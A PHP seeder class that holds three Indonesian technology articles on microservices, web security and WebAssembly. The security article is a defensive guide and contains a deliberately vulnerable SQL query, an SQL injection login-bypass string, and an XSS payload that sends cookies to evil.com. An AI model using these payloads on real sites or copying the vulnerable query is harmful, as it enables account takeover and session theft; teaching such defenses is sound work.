<?php

namespace App\Services\Articles;

class TechnologyArticles
{
    public static function getArticles(): array
    {
        $now = now();

        return [
            // ARTIKEL TEKNOLOGI 1: Cloud & Microservices
            [
                'title' => 'Arsitektur Cloud Computing & Microservices: Bagaimana Platform Digital Skalabilitas Tinggi Beroperasi',
                'slug' => 'arsitektur-cloud-computing-microservices-platform-digital-skalabel',
                'category' => 'teknologi',
                'summary' => 'Mengenal konsep komputasi awan modern: perbandingan Monolithic vs Microservices, orkestrasi kontainer dengan Docker & Kubernetes, serta strategi load balancing untuk menangani jutaan permintaan data secara simultan.',
                'content' => '<p>Di era ekonomi digital saat ini, platform seperti Netflix, GoTo, atau Tokopedia melayani puluhan juta pengguna aktif tanpa pernah mengalami *downtime* total saat memperbarui fitur baru. Rahasia di balik ketangguhan sistem tersebut terletak pada transformasi arsitektur dari aplikasi monolitik raksasa menjadi <strong>ekosistem Microservices berbasis Cloud Native</strong>.</p>
<p>Bagi para pengembang web pemula yang terbiasa membangun seluruh aplikasi dalam satu framework tunggal, memahami arsitektur cloud adalah tiket emas untuk melangkah ke jenjang arsitek sistem berskala global (*Senior System Architect*).</p>

<img src="https://images.unsplash.com/photo-1451187580459-43490279c0fa?auto=format&fit=crop&w=1200&q=80" alt="Jaringan data global komputasi awan dan infrastruktur server cerdas" style="width:100%;border-radius:16px;margin:24px 0;box-shadow:0 10px 25px rgba(0,0,0,0.1);">

<h2>1. Monolithic vs Microservices: Memilih Arsitektur yang Tepat</h2>
<p>Sebelum memutuskan memecah sistem, pahami trade-off mendasar antara kedua pendekatan arsitektur:</p>
<ul>
    <li><strong>Arsitektur Monolitik:</strong> Seluruh basis data, antarmuka pengguna, dan logika bisnis (autentikasi, pembayaran, katalog, notifikasi) digabung dalam satu repositori kode dan berjalan di satu proses server. Pendekatan ini sangat cepat untuk dibangun di tahap awal (*prototype*), namun menjadi bencana saat basis kode membesar karena satu error kecil di modul laporan dapat melumpuhkan seluruh sistem transaksi.</li>
    <li><strong>Arsitektur Microservices:</strong> Setiap domain bisnis dipecah menjadi layanan independen mandiri kecil yang berkomunikasi melalui jaringan (REST API atau gRPC) dan memiliki database terisolasi masing-masing. Tim pengembang dapat memperbarui layanan pembayaran tanpa menyentuh layanan katalog produk sama sekali.</li>
</ul>

<h2>2. Peran Kritis Kontainerisasi Docker & Kubernetes</h2>
<p>Dalam dunia microservices, perkataan klise <em>"di laptop saya jalan, kenapa di server gagal?"</em> tidak lagi dapat diterima. Kontainer Docker membungkus aplikasi beserta seluruh pustaka dependensi, runtime lingkungan, dan konfigurasinya menjadi satu unit portabel standar yang dijamin berperilaku identik di mana pun dieksekusi.</p>
<p>Ketika sistem memiliki ratusan kontainer layanan mikro, <strong>Kubernetes (K8s)</strong> bertindak sebagai kondektur orkestrasi otomatis yang:</p>
<ol>
    <li>Menjaga ketersediaan: Jika sebuah kontainer crash, Kubernetes langsung membangkitkan kontainer pengganti dalam 1 detik.</li>
    <li>Horizontal Pod Autoscaling: Menambah jumlah instance server secara otomatis saat trafik melonjak tajam (seperti pesta diskon tanggal kembar), dan menciutkannya kembali saat malam hari untuk menghemat biaya operasional.</li>
</ol>

<h2>3. Pola API Gateway & Reverse Proxy</h2>
<p>Klien mobile atau web browser tidak boleh menghubungi puluhan microservice secara langsung. Sistem memerlukan <strong>API Gateway</strong> di garis depan (menggunakan Nginx, Traefik, atau Kong) yang bertindak sebagai pintu gerbang tunggal untuk:</p>
<ul>
    <li>Validasi token autentikasi (JWT) dan otorisasi peran pengguna.</li>
    <li>Rate Limiting: Mencegah serangan DDoS atau bot scraping dengan membatasi jumlah panggilan per menit.</li>
    <li>SSL Termination: Memproses enkripsi HTTPS di tepi jaringan sehingga meringankan beban server backend.</li>
</ul>',
                'thumbnail_url' => 'https://images.unsplash.com/photo-1451187580459-43490279c0fa?auto=format&fit=crop&w=1200&q=80',
                'author_id' => 1,
                'author_name' => 'Vicky Koroh',
                'views_count' => 0,
                'status' => 'published',
                'is_featured' => false,
                'published_at' => $now,
                'created_at' => $now,
                'updated_at' => $now,
            ],

            // ARTIKEL TEKNOLOGI 2: Anatomi Keamanan Web Modern (SQLi, XSS, CSRF)
            [
                'title' => 'Anatomi Keamanan Web Modern: Cara Mencegah Serangan SQL Injection, Cross-Site Scripting (XSS), dan CSRF',
                'slug' => 'anatomi-keamanan-web-modern-mencegah-sqli-xss-csrf',
                'category' => 'teknologi',
                'summary' => 'Panduan praktis pengamanan aplikasi web dari 3 kerentanan OWASP Top 10 paling mematikan: prinsip pertahanan berlapis (defense in depth), validasi input ketat, CSP (Content Security Policy), dan token keamanan CSRF.',
                'content' => '<p>Membangun website dengan tampilan antarmuka yang memukau dan fitur yang lengkap hanyalah separuh dari tugas seorang rekayasawan web. Tanpa perlindungan keamanan siber yang kokoh, seluruh jerih payah Anda dapat musnah dalam hitungan menit akibat pencurian basis data pengguna, perusakan nama baik institusi (*defacement*), atau penuntutan hukum akibat kebocoran data pribadi (UU PDP).</p>
<p>Mari kita bedah secara ilmiah tiga vektor serangan web paling klasik dari standar OWASP (Open Web Application Security Project) beserta teknik pertahanan praktisnya.</p>

<img src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&w=1200&q=80" alt="Grafik keamanan siber gembok digital dan perisai data" style="width:100%;border-radius:16px;margin:24px 0;box-shadow:0 10px 25px rgba(0,0,0,0.1);">

<h2>1. SQL Injection (SQLi): Mengelabui Database Melalui Input Form</h2>
<p>SQL Injection terjadi ketika input yang dikirimkan oleh pengguna digabungkan secara langsung (*string concatenation*) ke dalam query SQL database tanpa melalui proses sanitasi:</p>

<h3>Contoh Kode Berbahaya (Vulnerable):</h3>
<pre class="ql-syntax">// JANGAN PERNAH MENULIS KODE SEPERTI INI!
$sql = "SELECT * FROM users WHERE email = \"" . $_POST["email"] . "\" AND password = \"" . $_POST["password"] . "\"";</pre>
<p>Jika peretas mengisikan kolom password dengan nilai <code>\' OR \'1\'=\'1</code>, query akan selalu bernilai benar (TRUE) dan peretas berhasil login sebagai akun pengguna pertama tanpa kata sandi!</p>

<h3>Solusi Mutlak: Gunakan Parameterized Queries (PDO Prepared Statements)</h3>
<pre class="ql-syntax">// KODE AMAN (SECURE):
$stmt = $pdo-&gt;prepare("SELECT id, name, password_hash FROM users WHERE email = :email LIMIT 1");
$stmt-&gt;execute(["email" =&gt; $_POST["email"]]);
$user = $stmt-&gt;fetch();</pre>
<p>Database memperlakukan input pengguna murni sebagai data literal teks, bukan sebagai perintah eksekusi logika SQL.</p>

<h2>2. Cross-Site Scripting (XSS): Menyusupkan Skrip Jahat ke Browser Korban</h2>
<p>XSS terjadi saat aplikasi web menampilkan kembali data yang dimasukkan pengguna (misal komentar artikel) ke halaman HTML tanpa proses lolos encoding karakter khusus seperti <code>&lt;</code>, <code>&gt;</code>, atau <code>"</code>.</p>
<ul>
    <li><strong>Bahaya XSS:</strong> Peretas dapat menyuntikkan skrip JavaScript <code>&lt;script&gt;fetch(&apos;https://evil.com?c=&apos; + document.cookie)&lt;/script&gt;</code> untuk mencuri cookie sesi autentikasi korban.</li>
    <li><strong>Solusi:</strong> Selalu gunakan fungsi escape HTML bawaan seperti <code>htmlspecialchars($input, ENT_QUOTES, &quot;UTF-8&quot;)</code> atau gunakan template engine otomatis seperti Blade Laravel (<code>@{{ $variable }}</code> otomatis melakukan sanitasi).</li>
    <li><strong>Benteng Ekstra:</strong> Terapkan HTTP Header <strong>Content-Security-Policy (CSP)</strong> untuk melarang eksekusi skrip inline yang tidak berizin.</li>
</ul>

<h2>3. Cross-Site Request Forgery (CSRF): Membajak Tindakan Pengguna</h2>
<p>CSRF adalah trik di mana situs web berbahaya menjebak browser pengguna agar mengirimkan permintaan yang tidak disadari (misal transfer saldo atau ganti email) ke situs web tepercaya tempat pengguna sedang login aktif.</p>
<ul>
    <li><strong>Solusi Anti-CSRF Token:</strong> Setiap form yang mengubah status data (POST, PUT, DELETE) wajib menyertakan token kriptografi acak yang hanya diketahui oleh server dan sesi aktif pengguna. Di Laravel, cukup sematkan direktif <code>&#64;csrf</code> di dalam setiap form HTML Anda.</li>
    <li><strong>Cookie SameSite:</strong> Gunakan atribut <code>SameSite=Lax</code> atau <code>SameSite=Strict</code> pada cookie sesi untuk melarang browser mengirim cookie saat permintaan berasal dari domain luar.</li>
</ul>',
                'thumbnail_url' => 'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&w=1200&q=80',
                'author_id' => 1,
                'author_name' => 'Vicky Koroh',
                'views_count' => 0,
                'status' => 'published',
                'is_featured' => false,
                'published_at' => $now,
                'created_at' => $now,
                'updated_at' => $now,
            ],

            // ARTIKEL TEKNOLOGI 3: WebAssembly (WASM)
            [
                'title' => 'WebAssembly (WASM): Membawa Performa Kode Bahasa C++, Rust, dan Python Berjalan Langsung di Browser',
                'slug' => 'webassembly-wasm-performa-kode-c-rust-python-di-browser',
                'category' => 'teknologi',
                'summary' => 'Revolusi teknologi web yang memungkinkan eksekusi kode tingkat rendah berkecepatan nyaris native di peramban: cara kerja binary format WASM, integrasi dengan JavaScript, dan studi kasus pengolahan grafis/audio berat.',
                'content' => '<p>Selama hampir tiga dekade sejak kelahirannya, JavaScript adalah satu-satunya bahasa pemrograman resmi yang mampu dieksekusi secara native di dalam peramban web. Meskipun mesin JavaScript modern seperti V8 di Google Chrome telah dilengkapi kompilator canggih (Just-In-Time Compiler), beban kerja komputasi ekstrem seperti pengeditan video 4K, simulasi fisika kompleks, pemrosesan audio multi-track, dan inferensi model Machine Learning tetap terbentur oleh sifat dinamis bahasa JavaScript.</p>
<p>Kehadiran standar terbuka <strong>WebAssembly (WASM)</strong> yang didukung bersama oleh W3C, Google, Apple, Microsoft, dan Mozilla telah menghancurkan batasan tersebut untuk selamanya.</p>

<img src="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=1200&q=80" alt="Visualisasi kode biner komputasi WebAssembly berkecepatan tinggi" style="width:100%;border-radius:16px;margin:24px 0;box-shadow:0 10px 25px rgba(0,0,0,0.1);">

<h2>1. Apa Itu WebAssembly?</h2>
<p>WebAssembly adalah format instruksi biner tingkat rendah (bytecode) yang dirancang untuk dieksekusi dengan kecepatan mendekati perangkat keras asli (*near-native speed*) di lingkungan peramban modern yang aman.</p>
<ul>
    <li><strong>Bukan Pengganti JavaScript:</strong> WASM dirancang bukan untuk menyingkirkan JavaScript, melainkan bekerja berdampingan. JavaScript menangani antarmuka pengguna (DOM), interaksi tombol, dan logika ringan, sementara kalkulasi matematika berat didelegasikan ke modul WebAssembly.</li>
    <li><strong>Mendukung Banyak Bahasa:</strong> Anda dapat menulis kode performa tinggi menggunakan bahasa C, C++, Rust, Go, atau bahkan mengeksekusi interpreter Python (Pyodide) langsung di browser pengguna tanpa instalasi server lokal.</li>
</ul>

<h2>2. Studi Kasus Nyata Industri Global</h2>
<ol>
    <li><strong>Figma:</strong> Seluruh mesin rendering vektor grafis Figma yang mampu membuka kanvas berisikan jutaan objek secara mulus dibangun menggunakan C++ yang dikompilasi ke WebAssembly.</li>
    <li><strong>Adobe Photoshop Web:</strong> Adobe berhasil mem-porting basis kode Photoshop C++ yang berusia puluhan tahun ke browser berkat teknologi WebAssembly dan WebGL.</li>
    <li><strong>Google Earth:</strong> Menampilkan visualisasi bumi 3D fotorealistik berkecepatan tinggi langsung di peramban tanpa memerlukan instalasi aplikasi desktop terpisah.</li>
</ol>

<h2>3. Cara Kerja Modul WASM di Browser</h2>
<p>Sebuah modul WebAssembly diunduh sebagai file biner berekstensi <code>.wasm</code>. Browser kemudian mengompilasi dan menginstansiasi modul tersebut menggunakan API WebAssembly JavaScript:</p>
<pre class="ql-syntax">WebAssembly.instantiateStreaming(fetch("math_core.wasm"))
    .then(results =&gt; {
        // Panggil fungsi matematika super cepat yang ditulis dalam bahasa Rust/C++
        const result = results.instance.exports.fastFibonacci(40);
        console.log("Hasil komputasi instan WASM:", result);
    });</pre>
<p>Dengan ekosistem WebAssembly, peramban web kini telah resmi bertransformasi menjadi sistem operasi komputasi universal masa depan.</p>',
                'thumbnail_url' => 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=1200&q=80',
                'author_id' => 1,
                'author_name' => 'Vicky Koroh',
                'views_count' => 0,
                'status' => 'published',
                'is_featured' => false,
                'published_at' => $now,
                'created_at' => $now,
                'updated_at' => $now,
            ],
        ];
    }
}
